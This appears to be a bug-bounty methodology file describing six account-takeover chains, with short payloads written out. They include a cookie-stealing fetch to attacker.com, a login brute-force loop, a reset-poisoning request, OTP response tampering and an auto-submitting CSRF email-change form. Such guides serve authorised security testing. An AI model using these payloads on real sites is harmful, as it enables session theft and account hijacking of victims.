---
name: attack-account-takeover
description: "Account takeover chains — XSS + session hijacking, password reset poisoning, response manipulation, CSRF, and token leakage composites"
category: "authentication"
version: "1.0"
author: "bountyreper-official"
tags:
  - account-takeover
  - ato
  - xss
  - csrf
  - chaining
tech_stack:
  - web
cwe_ids:
  - CWE-287
  - CWE-352
  - CWE-79
chains_with:
  - attack-password-reset
  - attack-oauth
  - attack-open-redirect
  - wstg-clnt-01
prerequisites: []
severity_boost:
  wstg-clnt-01: "XSS + session hijacking = ATO via cookie theft"
  attack-open-redirect: "Open redirect + OAuth = code theft ATO"
---

# Account Takeover Chains

## Objective

Chain low/medium vulnerabilities into full account takeover via session hijacking, response manipulation, and token leakage.

> **Attribution:** Chains from [KathanP19/HowToHunt — Account_Takeovers_Methodologies](https://github.com/KathanP19/HowToHunt/tree/master/Account_Takeovers_Methodologies). Licensed GPL-3.0.

## Testing Methodology

### Chain 1: XSS + Session Hijacking

1. Find XSS (use dalfox, WaybackURLs + gf)
2. Steal cookies:
   ```js
   fetch('https://attacker.com/log?c='+document.cookie)
   ```
3. Replay session: `curl -H "Cookie: session=STOLEN" https://target.com/account`

### Chain 2: No Rate Limit + Weak Password Policy

1. Test weak password acceptance: create account with `password=1234` — if accepted, policy weak
2. Brute force login:
   ```bash
   for p in $(cat passwords.txt); do
     curl -X POST https://target.com/login -d "email=victim@target.com&password=$p" | grep -q "success" && echo $p && break
   done
   ```

### Chain 3: Password Reset Poisoning → Token Theft

```http
POST /reset HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
email=victim@target.com
```
If reset link goes to `attacker.com/reset?token=...`, capture and use.

### Chain 4: Response Manipulation OTP Bypass

```http
POST /verify-otp HTTP/1.1
{"code":"0000"}

# Response: {"code":"invalid_credentials"}
# Manipulate to:
{"code":"valid_credentials"}
# Or {"verify":false} -> {"verify":true}
```
Intercept with Burp, change response, forward — if client trusts response, bypass.

### Chain 5: CSRF on Sensitive Actions

Test CSRF on:
- Change password
- Email change (then reset to your email)
- Security question change

```html
<form action="https://target.com/change-email" method="POST">
  <input name="email" value="attacker@evil.com">
</form><script>document.forms[0].submit()</script>
```

### Chain 6: Token Leak in Response

```bash
# Registration and password reset
# Intercept REQUEST and RESPONSE
# Action -> Do intercept response -> Check for token/link/OTP in response body even though it should be email-only
curl -X POST https://target.com/register -d "email=test@test.com" -D- | grep -i "token\|otp\|link"
```

## What Constitutes a Finding

| Chain | Severity |
|-------|----------|
| Any chain leading to takeover of victim account | Critical (P1) |
| Response manipulation bypass | High (P2) |
| CSRF on email change → ATO | High (P2) |

## References

- [HowToHunt — Account Takeovers](https://github.com/KathanP19/HowToHunt/tree/master/Account_Takeovers_Methodologies)
